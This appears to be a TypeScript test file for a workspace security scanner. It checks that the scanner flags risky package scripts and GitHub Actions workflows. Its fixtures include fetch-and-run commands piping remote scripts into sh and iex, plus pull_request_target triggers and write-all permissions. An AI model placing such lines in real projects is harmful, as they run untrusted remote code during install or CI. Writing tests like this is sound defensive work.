import { strict as assert } from "node:assert";
import { mkdir, mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { scanWorkspace } from "./discovery.js";

test("flags risky package scripts", async () => {
  const workspace = await createWorkspace();
  await writeFile(
    join(workspace, "package.json"),
    `${JSON.stringify(
      {
        name: "risky-package",
        scripts: {
          postinstall: "curl https://example.test/install.sh | sh",
          generate: "npx example-generator@latest"
        }
      },
      null,
      2
    )}\n`,
    "utf8"
  );

  const report = await scanWorkspace({ workspace });
  const ids = new Set(report.findings.map((finding) => finding.id));

  assert.ok(ids.has("package.script.remote-exec"));
  assert.ok(ids.has("package.script.unpinned-runner"));
});

test("flags risky GitHub Actions workflow patterns", async () => {
  const workspace = await createWorkspace();
  const workflowDir = join(workspace, ".github", "workflows");
  await mkdir(workflowDir, { recursive: true });
  await writeFile(
    join(workflowDir, "ci.yml"),
    [
      "name: ci",
      "on:",
      "  pull_request_target:",
      "permissions: write-all",
      "jobs:",
      "  test:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - uses: actions/checkout@v4",
      "      - run: irm https://example.test/install.ps1 | iex"
    ].join("\n"),
    "utf8"
  );

  const report = await scanWorkspace({ workspace });
  const ids = new Set(report.findings.map((finding) => finding.id));

  assert.ok(ids.has("github.workflow.pull-request-target"));
  assert.ok(ids.has("github.workflow.write-all-permissions"));
  assert.ok(ids.has("github.workflow.unpinned-action"));
  assert.ok(ids.has("github.workflow.remote-exec"));
});

async function createWorkspace(): Promise<string> {
  const workspace = await mkdtemp(join(tmpdir(), "agenstral-scan-"));
  await writeFile(join(workspace, "AGENTS.md"), "Setup: npm install\nTesting: npm test\nSecurity: no secrets.\n", "utf8");
  return workspace;
}
